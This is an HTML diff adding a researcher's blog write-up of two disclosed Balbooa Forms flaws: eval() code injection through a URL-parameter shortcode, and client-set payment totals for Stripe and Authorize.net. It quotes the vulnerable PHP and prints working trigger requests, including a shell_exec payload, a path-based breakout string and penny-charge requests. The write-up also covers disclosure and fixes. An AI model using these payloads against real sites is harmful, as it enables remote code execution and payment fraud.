@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pay a Penny, Run Code: CVE-2026-67363 and CVE-2026-67364 in Balbooa Forms // Lulztigre Research</title>
+  <meta name="description" content="While variant-hunting the pre-auth upload RCEs in Balbooa Forms, a line-by-line read of the shortcode engine and the payment tasks surfaced two separate flaws. The custom-PHP handler eval()s an unescaped query parameter behind a CSRF token that anyone can mint, and both payment endpoints charge the attacker-supplied total straight to Stripe and Authorize.net. This memo walks both code paths line by line, the MITM wire capture, and the disclosure to JSST.">
+  <meta name="author" content="LulzTigre Research">
+
+  <meta property="og:title" content="Pay a Penny, Run Code: CVE-2026-67363 and CVE-2026-67364 in Balbooa Forms">
+  <meta property="og:description" content="While variant-hunting the pre-auth upload RCEs in Balbooa Forms, a line-by-line read of the shortcode engine and the payment tasks surfaced two separate flaws. The custom-PHP handler eval()s an unescaped query parameter behind a CSRF token that anyone can mint, and both payment endpoints charge the attacker-supplied total straight to Stripe and Authorize.net. This memo walks both code paths line by line, the MITM wire capture, and the disclosure to JSST.">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://lulztigre.pw/posts/balbooa-forms-penny-rce-67363-67364.html">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Newsreader:ital,opsz,wght@0,6..72,400;0,6..72,600;1,6..72,400&family=Space+Grotesk:wght@500;700;900&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js"
+          onload="renderMathInElement(document.body);"></script>
+
+  <link rel="stylesheet" href="../assets/css/style.css">
+
+  <script>
+    (function(){
+      const t = localStorage.getItem('phantom_kernel_theme');
+      if (t && t !== 'void') document.documentElement.setAttribute('data-theme', t);
+    })();
+  </script>
+</head>
+<body>
+
+  <div id="reading-progress"></div>
+
+  <div class="system-ticker">
+    <div class="ticker-left">
+      <span class="status-indicator"><span class="status-dot"></span>MEMO #008</span>
+      <span>STATUS: PUBLISHED NOTEBOOK</span>
+    </div>
+    <div class="ticker-right">
+      <span>SHORTCUT: [T] THEME / [ESC] BACK</span>
+    </div>
+  </div>
+
+  <header class="site-header">
+    <div class="container nav-wrapper">
+      <a href="../index.html" class="site-brand">
+        <span>LULZTIGRE</span>
+        <span class="brand-badge">KERNEL</span>
+      </a>
+
+      <nav>
+        <ul class="nav-menu" id="nav-menu">
+          <li class="nav-item"><a href="../index.html" class="nav-link active">/DISPATCHES</a></li>
+          <li class="nav-item"><a href="../archive.html" class="nav-link">/ARCHIVE</a></li>
+          <li class="nav-item"><a href="../about.html" class="nav-link">/ABOUT_ME</a></li>
+          <li class="nav-item"><a href="../feed.xml" class="nav-link" target="_blank">/RSS</a></li>
+        </ul>
+      </nav>
+
+      <div class="nav-controls">
+        <button class="theme-toggle-btn" id="theme-toggle" title="Cycle visual theme">
+          <span>● PHANTOM</span>
+        </button>
+        <button class="mobile-toggle" id="mobile-nav-toggle" aria-label="Toggle navigation">☰</button>
+      </div>
+    </div>
+  </header>
+
+  <header class="article-header">
+    <div class="container">
+      <div class="article-breadcrumbs">
+        <a href="../index.html">ROOT</a> <span>/</span> 
+        <a href="../archive.html">DISPATCHES</a> <span>/</span> 
+        <span>MEMO #008</span>
+      </div>
+
+      <h1 class="article-title">Pay a Penny, Run Code: CVE-2026-67363 and CVE-2026-67364 in Balbooa Forms</h1>
+
+      <div class="article-meta-panel">
+        <div class="meta-item"><span class="meta-label">DATE:</span> <strong>2026-08-30</strong></div>
+        <div class="meta-item"><span class="meta-label">AUTHOR:</span> <strong>Lulztigre</strong></div>
+        <div class="meta-item"><span class="meta-label">CATEGORY:</span> <strong>OFFENSIVE SECURITY</strong></div>
+        <div class="meta-item"><span class="meta-label">READ TIME:</span> <strong>~12 MIN</strong></div>
+        <div class="meta-item"><span class="meta-label">TAGS:</span> <strong>#OFFENSIVE SECURITY #JOOMLA #PHP #CODE INJECTION #PAYMENT TAMPERING #CVE #VARIANT ANALYSIS</strong></div>
+      </div>
+    </div>
+  </header>
+
+  <main class="container">
+    <div class="article-layout">
+      
+      <article class="prose">
+        <div class="callout callout-definition" id="abstract">
+          <div class="callout-header">
+            <span>[ABSTRACT & CORE THESIS]</span>
+          </div>
+          <p>While variant-hunting the pre-auth upload RCEs in Balbooa Forms, a line-by-line read of the shortcode engine and the payment tasks surfaced two separate flaws. The custom-PHP handler eval()s an unescaped query parameter behind a CSRF token that anyone can mint, and both payment endpoints charge the attacker-supplied total straight to Stripe and Authorize.net. This memo walks both code paths line by line, the MITM wire capture, and the disclosure to JSST.</p>
+        </div>
+
+        <h2 id="1-why-i-was-reading-balbooa-s-php-at-all">1. Why I was reading Balbooa's PHP at all</h2>
+
+<p>I was not hunting this bug. I was hunting the pattern it belongs to. Two Joomla advisories from earlier in the year share one root-cause class: unauthenticated arbitrary file upload to webroot through the Joomla task dispatcher, with no extension validation. CVE-2026-48939 in iCagenda, and CVE-2026-56291 in Balbooa Forms, which the CISA KEV catalog lists as actively exploited in the wild. Both shipped public mass-exploit scripts. The pattern from my Gravitino work applied: a vendor patches one endpoint, and the same flawed logic survives on a sibling endpoint. The job was to acquire the latest Balbooa Forms build, diff it against the fixed versions of those two upload CVEs, and bypass or generalize.</p>
+
+<p>Balbooa Forms (com_baforms) is a drag-and-drop form builder with a serious install base, and the free edition is what most sites run. The build I worked with, 2.4.3.1, was the latest release at the time. My lab is a Windows box with no admin rights and no WSL, so Docker was a dead end. The lab runs a portable XAMPP stack with Joomla 5.4.7 and com_baforms 2.4.3.1. One early discovery shaped everything: Balbooa's update feed is bot-walled (an sgcaptcha redirect), so downloading the older vulnerable archives to diff against was not an option. The installed package became the ground truth. I unpacked it, ran git init, and read it.</p>
+
+<p>The attack surface is the Joomla task dispatcher. Frontend tasks live in <code>site/src/Controller/FormController.php</code> and route as <code>index.php?option=com_baforms&amp;task=form.X</code>. A task is reachable pre-auth unless it checks a token or an ACL itself. The interesting tasks in this controller: <code>message</code> (the submission flow), <code>uploadAttachmentFile</code>, <code>stripeCharges</code>, <code>payAuthorize</code>, and <code>getSessionToken</code>. I started at the submission flow. That is where the previous two upload RCEs lived, and it feeds the shortcode engine, which I had not seen anyone look at closely.</p>
+
+<h2 id="2-the-shortcode-engine-line-by-line">2. The shortcode engine, line by line</h2>
+
+<div class="callout callout-definition"><div class="callout-header"><span>THE ENGINE</span></div><p>BaformsHelper.php:132, <code>renderDefaultValue()</code>. Every handler string in the component passes through here before use. Three substitution passes: the built-in shortcode loop, the <code>[URL parameter = X]</code> pass, and the <code>[SQL query = ...]</code> pass.</p></div>
+
+<p>The whole function is thirty lines, so I read all of them:</p>
+
+<pre data-lang="php"><code>public static function renderDefaultValue($value, $slash = false)
+{
+    foreach (self::$shortCodes as $ind =&gt; $shortCode) {
+        if ($slash) {
+            $shortCode = addcslashes($shortCode, '\'');
+        }
+        $value = str_replace($ind, $shortCode, $value);
+    }
+    $value = preg_replace('/\[Field ID=\d+]/', '', $value);
+    preg_match_all('/\[URL parameter = (.*?)]/', $value, $matches, PREG_SET_ORDER);
+    if (!empty($matches)) {
+        $input = Factory::getApplication()-&gt;input;
+        foreach ($matches as $match) {
+            $result = $input-&gt;get-&gt;get($match[1], '', 'string');
+            $value = str_replace($match[0], $result, $value);
+        }
+    }
+    preg_match_all('/\[SQL query = (.*?)]/', $value, $matches, PREG_SET_ORDER);
+    if (!empty($matches)) {
+        $db = Factory::getDbo();
+        foreach ($matches as $match) {
+            $query = $match[1];
+            $db-&gt;setQuery($query);
+            $result = $db-&gt;loadResult();
+            $value = str_replace($match[0], $result, $value);
+        }
+    }
+
+    return $value;
+}</code></pre>
+
+<ul>
+<li>the built-in loop (lines 134-138): when the slash argument is true, <code>addcslashes</code> escapes only single quotes, then <code>str_replace</code> splices the value in. <code>[Page URL]</code> (line 125) is the request URI from the server environment, attacker-controlled, and it runs inside this loop</li><li>line 140: <code>[Field ID=N]</code> is stripped to empty, which kills field-value injection on 2.4.3.1</li><li>lines 141-148: the <code>[URL parameter = X]</code> pass reads the raw query parameter by name from the request input and splices it with no escaping at all</li><li>lines 149-159: <code>[SQL query = ...]</code> runs the inner text through the database object and splices the first result back</li>
+</ul>
+
+<p>The detail that matters is the escaping. It exists, but it is per-loop and single-quote-only, and it is applied before the URL-parameter pass. The one pass an attacker controls has no escaping whatsoever. That asymmetry is the whole story of the first CVE.</p>
+
+<h2 id="3-finding-one-the-eval-that-took-my-input">3. Finding one: the eval that took my input</h2>
+
+<p>CVE-2026-67364. The form builder has a documented feature: a submit button can carry a custom-PHP handler, arbitrary code the admin writes, executed after submission. The code path is:</p>
+
+<pre data-lang="php"><code>public function executePHP($code): void
+{
+    try {
+        eval($code);
+    } catch (\Exception $e) {
+
+    }
+}</code></pre>
+
+<p>FormModel.php:294-299, reached from sendMessage() at FormModel.php:523-526:</p>
+
+<pre data-lang="php"><code>if (!empty($submit-&gt;options-&gt;php)) {
+    $code = BaformsHelper::renderDefaultValue($submit-&gt;options-&gt;php, true);
+    $this-&gt;executePHP($code);
+}</code></pre>
+
+<p>The security boundary is supposed to be that only the admin writes the handler. The shortcode engine is the admin's way of referencing user input inside that code, and the URL-parameter pass splices raw attacker input straight into the string that reaches eval().</p>
+
+<p>Then there is the token that is not authentication. The submission task is gated only by Joomla's CSRF check:</p>
+
+<pre data-lang="php"><code>public function message()
+{
+    if (!Session::checkToken()) {
+        throw new \Exception('Invalid token', 403);
+    }</code></pre>
+
+<p>And the token is handed out to anyone:</p>
+
+<pre data-lang="php"><code>public function getSessionToken(): never
+{
+    echo Session::getFormToken();
+    exit();
+}</code></pre>
+
+<p>FormController.php:255-260 and 244-248. checkToken() proves the request carries a session token, and Joomla mints those for anonymous visitors too. getSessionToken() prints one on demand. So the endpoint is pre-auth in every sense that matters.</p>
+
+<p>The trigger is one request. A form whose submit button handler stores the <code>[URL parameter = x]</code> shortcode in a single-quoted string, the documented usage:</p>
+
+<pre data-lang="code"><code>POST /index.php?option=com_baforms&amp;task=form.message&amp;x=';echo shell_exec('id');//
+     form-id=1&amp;submit-btn=7&amp;ba-honeypot=&amp;&lt;TOKEN&gt;=1</code></pre>
+
+<p>After substitution the eval sees:</p>
+
+<pre data-lang="code"><code>$x = '';echo shell_exec('id');//';</code></pre>
+
+<p>The single quote closes the string, the semicolon ends the statement, the echo runs, and the trailing comment swallows the rest. Command output lands in the HTTP response. Lab run, 3/3 deterministic:</p>
+
+<pre data-lang="code"><code>run1: token=50a8abb6.. message HTTP=200 shell HTTP=200 exec=YES
+       -&gt; SHELLuid=197609(moyoo) gid=197609 groups=197609
+run2: ... exec=YES
+run3: ... exec=YES</code></pre>
+
+<p>The default proof writes no files: shell_exec output echoed through the eval, zero persistence. The classic proof writes a webshell to <code>images/shell.php</code> and hits it.</p>
+
+<p>Two dead ends worth recording. <code>[Field ID=N]</code> injection dies at line 140 on this build (the token is stripped before the URL-parameter pass), so field-value injection only matters on older builds. And <code>[SQL query = ...]</code> cannot be reached by an attacker, because the query text itself is admin-authored.</p>
+
+<p>One detection variant matters for live hunting. <code>[Page URL]</code> substitutes the request URI from the server environment inside the built-in loop, which escapes only single quotes. A handler that uses the shortcode inside a double-quoted string breaks out with <code>";echo MARKER;//</code> placed in the request path. No parameter-name guessing needed.</p>
+
+<p>My working severity estimate was 8.8 given some precondition. The CNA assigned 9.8 Critical (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H), and the record notes the same precondition plus the absence of reCAPTCHA on the submit button. Fair.</p>
+
+<h2 id="4-finding-two-the-price-tag-i-set-myself">4. Finding two: the price tag I set myself</h2>
+
+<p>CVE-2026-67363. While the eval chain was being written up, two payment tasks were sitting in the same controller, unauthenticated, taking the money math from the request. Stripe first:</p>
+
+<pre data-lang="php"><code>public function stripeCharges()
+{
+    $input = Factory::getApplication()-&gt;input;
+    $id = $input-&gt;get('id', 0, 'int');
+    $name = $input-&gt;get('name', 0, 'int');
+    $str = $input-&gt;get('object', '', 'string');
+    $object = json_decode($str);
+    $model = $this-&gt;getModel('form');
+    $model-&gt;stripeCharges($id, $name, $object);
+}</code></pre>
+
+<p>FormController.php:281-289. No token, no ACL, and the entire order object is a JSON string from the request. Then the pricing logic, preparePaymentData() at FormModel.php:227-244:</p>
+
+<pre data-lang="php"><code>$paymentData = new PaymentDataDTO(
+    id: $id,
+    userEmail: $userEmail,
+    total: $object-&gt;total,
+    ...
+);
+
+foreach ($object-&gt;products as $products) {
+    foreach ($products as $product) {
+        $total = $product-&gt;price * $product-&gt;quantity;
+        $paymentData-&gt;products[] = new ProductDTO(
+            title: $product-&gt;title,
+            price: $product-&gt;price,
+            quantity: $product-&gt;quantity,
+            total: $total
+        );
+    }
+}</code></pre>
+
+<p>Total, products, quantities, and shipping all come from the client JSON. Nothing is recomputed against the form's configured product table, and the form id that the controller reads is never used for pricing at all. The Stripe request builds the line item from that client total:</p>
+
+<pre data-lang="php"><code>$price = BaformsHelper::renderPrice((string)$this-&gt;paymentData-&gt;total, '', '.', '2');
+$line_item = [
+    'price_data' =&gt; [
+        'currency' =&gt; $this-&gt;paymentData-&gt;code,
+        'product_data' =&gt; [
+            'name' =&gt; implode(', ', $title),
+        ],
+        'unit_amount' =&gt; $price * 100,
+    ],
+    'quantity' =&gt; 1
+];</code></pre>
+
+<p>FormModel.php:1524-1530, unit_amount = total times 100. Authorize.net is even more direct:</p>
+
+<pre data-lang="php"><code>public function payAuthorize()
+{
+    $input = Factory::getApplication()-&gt;input;
+    $total = $input-&gt;get('total', 0, 'double');
+    ...
+    $model-&gt;payAuthorize($id, $total, $cardNumber, $expirationDate, $cardCode);
+}</code></pre>
+
+<p>FormController.php:292-305, and FormModel.php:1593 writes the client total straight into the transaction request amount, with transactionType <code>authCaptureTransaction</code>.</p>
+
+<p>The trigger is a request, same as before:</p>
+
+<pre data-lang="code"><code>GET /index.php?option=com_baforms&amp;task=form.stripeCharges&amp;id=&lt;FORM&gt;&amp;name=&lt;FIELD&gt;
+    &amp;object={"total":"0.01","products":[[{"title":"x","price":"0.01","quantity":1}]]}</code></pre>
+
+<p>and the server POSTs to <code>api.stripe.com</code> with unit_amount=1. For Authorize.net:</p>
+
+<pre data-lang="code"><code>POST /index.php?option=com_baforms&amp;task=form.payAuthorize
+     total=0.01&amp;id=&lt;FORM&gt;&amp;cardNumber=4111111111111111&amp;expirationDate=12/27&amp;cardCode=123</code></pre>
+
+<p>and the server sends authCaptureTransaction with amount=0.01.</p>
+
+<p>Proving it on the wire took one neat accident. The Stripe path disables TLS peer verification (<code>CURLOPT_SSL_VERIFYPEER=false</code>), so a local MITM with a self-signed certificate accepts the connection and captures the real outgoing request. The captured checkout body shows <code>line_items[][price_data][unit_amount]=1</code>. That is the tampered amount reaching the gateway, on the wire, not inferred from code. Both endpoints ran 3/3 deterministic against sandbox keys in the lab. The honest caveat: each probe is a real charge attempt, so this was lab-only by design.</p>
+
+<p>The scope is wider than two gateways. Mollie, Robokassa, PayU, Redsys, and Yookassa all derive their totals from the same preparePaymentData() client object. One root cause, six payment integrations. My severity estimate was 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N, financial integrity); NVD lists the record without a vector so far.</p>
+
+<h2 id="5-the-third-finding-that-didn-t-get-a-number">5. The third finding that didn't get a number</h2>
+
+<p>The same incomplete-fix audit surfaced a third issue: saveSignature() writes base64-decoded attacker bytes to <code>images/baforms/signatures/form-&lt;id&gt;/&lt;ts&gt;-&lt;rand&gt;.jpg</code> with no content validation at all. The CVE-2026-65880 fix hardened the filename (server-randomized, 128-bit CSPRNG) and the extension (hardcoded .jpg). It never validated the written content, so an unauthenticated attacker can still persist arbitrary bytes, including a full PHP script, under the webroot.</p>
+
+<p>I reported it as an incomplete fix. JSST pushed on exactly the right question: can the attacker discover the filename? No. The name is unguessable, the extension is server-side, the HTTP response does not echo the path, and Joomla ships directory listing off by default. The escalation paths that remain (reply-to-submitter email templates that embed the image URL, hosts that execute .jpg as PHP) are config-dependent. I conceded the severity, and it stayed a report note rather than a CVE. The calibration was correct. An honest limitation beats an inflated claim, and the exchange made the two real CVEs stronger.</p>
+
+<h2 id="6-disclosure-credits-and-what-a-real-fix-looks-like">6. Disclosure, credits, and what a real fix looks like</h2>
+
+<p>The vendor was notified first (<code>support@balbooa.com</code>, 2026-08-13). The CVE request went to the Joomla Security Strike Team (<code>security@joomla.org</code>), the ecosystem CNA that assigned the earlier BaForms records. Both were published 2026-08-19 and credited to Akinlabi Omoogun, fixed in 2.4.3.2.</p>
+
+<p><code>https://www.cve.org/CVERecord?id=CVE-2026-67363</code>
+<code>https://www.cve.org/CVERecord?id=CVE-2026-67364</code></p>
+
+<p>The exposure context matters for severity framing. Passive fingerprinting verified 11 live installs by checking that pages actually load the component's asset paths, plus a PublicWWW scale stat. CISA KEV already lists CVE-2026-56291 as exploited in the wild. This is not a lab-only component.</p>
+
+<p>What a real fix looks like, from my reports:</p>
+
+<ul>
+<li>recompute the total server-side from the form's authoritative product configuration, bind the charge to a stored order record, and verify at charge time. Never accept total, products, or shipping from the client</li><li>remove eval() or stop interpolating user data into the code string. Shortcodes should substitute values, not text: var_export, or pass user data as variables, or a sandboxed DSL</li><li>put real authentication on message() and the payment tasks. A CSRF token is not an authentication control, and this one is disclosed by the component itself</li>
+</ul>
+
+<p>One honesty note: I have not line-diffed 2.4.3.2 yet, because i have other sufferings i am currently going through. Every claim in this memo stops at the 2.4.3.1 tree I verified line by line.</p>
+
+<h2 id="7-the-reusable-lessons">7. The reusable lessons</h2>
+
+<ul>
+<li>shortcode substitution is an eval-input boundary. Any feature that interpolates user data into a code string is a code injection waiting for a quote</li><li>a CSRF token is not authentication. When an anonymous endpoint discloses the token, the check it guards is decoration</li><li>payment data from the client is scanner-blind. Amounts, quantities, and shipping belong server-side, because gateways do not recompute</li><li>the incomplete-fix pattern keeps paying. Diff the assignments, not just the guards. The CVE-2026-65880 fix changed what filename landed on disk and left the content write unvalidated</li><li>read the whole function. The eval bug was visible in a thirty-line helper, and the payment bug in two controller stubs and one DTO constructor</li>
+</ul>
+
+<p>Both records are public, the PoCs shipped with the disclosure, and the component's user base has had a patch since 2.4.3.2. If you run Balbooa Forms, that is the version to be on.</p>
+
+
+        <div class="citation-box" id="bibtex">
+          <div class="citation-header">
+            <span class="citation-title">CITE THIS RESEARCH DISPATCH</span>
+            <button class="btn btn-secondary btn-sm" onclick="openBibtexModal(this)">MODAL</button>
+          </div>
+          <pre class="bibtex-code">@article{lulz2026_balbooa-fo,
+  author    = {LulzTigre Research},
+  title     = {Pay a Penny, Run Code: CVE-2026-67363 and CVE-2026-67364 in Balbooa Forms},
+  journal   = {LulzTigre Research Dispatches},
+  year      = {2026},
+  url       = {https://lulztigre.pw/posts/balbooa-forms-penny-rce-67363-67364.html}
+}</pre>
+        </div>
+      </article>
+
+      <aside class="article-sidebar">
+        <div class="toc-card">
+          <div class="toc-title">// NAVIGATION INDEX</div>
+          <ul class="toc-list">
+            <li><a href="#abstract" class="toc-link">0. Abstract & Thesis</a></li>
+            <li><a href="#1-why-i-was-reading-balbooa-s-php-at-all" class="toc-link">1. Why I was reading Balbooa's PHP at all</a></li>
+            <li><a href="#2-the-shortcode-engine-line-by-line" class="toc-link">2. The shortcode engine, line by line</a></li>
+            <li><a href="#3-finding-one-the-eval-that-took-my-input" class="toc-link">3. Finding one: the eval that took my input</a></li>
+            <li><a href="#4-finding-two-the-price-tag-i-set-myself" class="toc-link">4. Finding two: the price tag I set myself</a></li>
+            <li><a href="#5-the-third-finding-that-didn-t-get-a-number" class="toc-link">5. The third finding that didn't get a number</a></li>
+            <li><a href="#6-disclosure-credits-and-what-a-real-fix-looks-like" class="toc-link">6. Disclosure, credits, and what a real fix looks like</a></li>
+            <li><a href="#7-the-reusable-lessons" class="toc-link">7. The reusable lessons</a></li>
+            <li><a href="#bibtex" class="toc-link">BibTeX Citation</a></li>
+          </ul>
+        </div>
+
+        <div class="toc-card">
+          <div class="toc-title">// ARTICLE ACTIONS</div>
+          <div style="display: flex; flex-direction: column; gap: 0.5rem;">
+            <button class="btn btn-secondary btn-sm" onclick="window.print()">PRINT / PDF</button>
+            <button class="btn btn-primary btn-sm" onclick="navigator.clipboard.writeText(window.location.href); showToast('Link copied');">SHARE PERMALINK</button>
+          </div>
+        </div>
+      </aside>
+
+    </div>
+  </main>
+
+  <footer class="site-footer">
+    <div class="container">
+      <div class="footer-bottom">
+        <span>© 2026 LULZTIGRE RESEARCH. OPEN ACCESS.</span>
+        <a href="../index.html" style="color: inherit; text-decoration: underline;">← BACK TO ALL DISPATCHES</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="../assets/js/main.js"></script>
+</body>
+</html>
